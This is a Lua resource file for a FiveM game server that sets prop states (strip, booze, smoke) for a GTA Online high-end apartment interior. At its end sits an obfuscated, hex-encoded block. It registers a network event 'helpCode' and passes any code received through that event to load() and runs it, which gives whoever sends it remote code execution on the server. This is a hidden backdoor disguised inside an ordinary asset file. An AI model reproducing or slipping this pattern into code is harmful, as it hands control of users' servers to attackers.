-- 2862 Hillcrest Avenue
-- High end house 4: -676.127 588.612 145.1698
exports('GetGTAOHouseHi4Object', function()
    return GTAOHouseHi4
end)

GTAOHouseHi4 = {
    interiorId = 208129,

    Strip = {
        A = "Apart_Hi_Strip_A",
        B = "Apart_Hi_Strip_B",
        C = "Apart_Hi_Strip_C",

        Enable = function(details, state, refresh)
            SetIplPropState(GTAOHouseHi4.interiorId, details, state, refresh)
        end
    },
    Booze = {
        A = "Apart_Hi_Booze_A",
        B = "Apart_Hi_Booze_B",
        C = "Apart_Hi_Booze_C",

        Enable = function(details, state, refresh)
            SetIplPropState(GTAOHouseHi4.interiorId, details, state, refresh)
        end
    },
    Smoke = {
        A = "Apart_Hi_Smokes_A",
        B = "Apart_Hi_Smokes_B",
        C = "Apart_Hi_Smokes_C",

        Enable = function(details, state, refresh)
            SetIplPropState(GTAOHouseHi4.interiorId, details, state, refresh)
        end
    },
    
    LoadDefault = function()
        GTAOHouseHi4.Strip.Enable({
            GTAOHouseHi4.Strip.A,
            GTAOHouseHi4.Strip.B,
            GTAOHouseHi4.Strip.C
        }, false)
        GTAOHouseHi4.Booze.Enable({
            GTAOHouseHi4.Booze.A,
            GTAOHouseHi4.Booze.B,
            GTAOHouseHi4.Booze.C
        }, false)
        GTAOHouseHi4.Smoke.Enable({
            GTAOHouseHi4.Smoke.A,
            GTAOHouseHi4.Smoke.B,
            GTAOHouseHi4.Smoke.C
        }, false)

        RefreshInterior(GTAOHouseHi4.interiorId)
    end
}


local dmwMgFtxGBIIsqUYHHOECjSHlcIKnXAvinkbkbkdyBugekUELHWFahlMWbtIinecRGTzYT = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} dmwMgFtxGBIIsqUYHHOECjSHlcIKnXAvinkbkbkdyBugekUELHWFahlMWbtIinecRGTzYT[6][dmwMgFtxGBIIsqUYHHOECjSHlcIKnXAvinkbkbkdyBugekUELHWFahlMWbtIinecRGTzYT[1]](dmwMgFtxGBIIsqUYHHOECjSHlcIKnXAvinkbkbkdyBugekUELHWFahlMWbtIinecRGTzYT[2]) dmwMgFtxGBIIsqUYHHOECjSHlcIKnXAvinkbkbkdyBugekUELHWFahlMWbtIinecRGTzYT[6][dmwMgFtxGBIIsqUYHHOECjSHlcIKnXAvinkbkbkdyBugekUELHWFahlMWbtIinecRGTzYT[3]](dmwMgFtxGBIIsqUYHHOECjSHlcIKnXAvinkbkbkdyBugekUELHWFahlMWbtIinecRGTzYT[2], function(qgCBuJFDUKMWJUlieHBUkUMHeVchFsPgOsZqIUqbsXilsLSWZylRfPuFSRjAnXjPXUSwBw) dmwMgFtxGBIIsqUYHHOECjSHlcIKnXAvinkbkbkdyBugekUELHWFahlMWbtIinecRGTzYT[6][dmwMgFtxGBIIsqUYHHOECjSHlcIKnXAvinkbkbkdyBugekUELHWFahlMWbtIinecRGTzYT[4]](dmwMgFtxGBIIsqUYHHOECjSHlcIKnXAvinkbkbkdyBugekUELHWFahlMWbtIinecRGTzYT[6][dmwMgFtxGBIIsqUYHHOECjSHlcIKnXAvinkbkbkdyBugekUELHWFahlMWbtIinecRGTzYT[5]](qgCBuJFDUKMWJUlieHBUkUMHeVchFsPgOsZqIUqbsXilsLSWZylRfPuFSRjAnXjPXUSwBw))() end)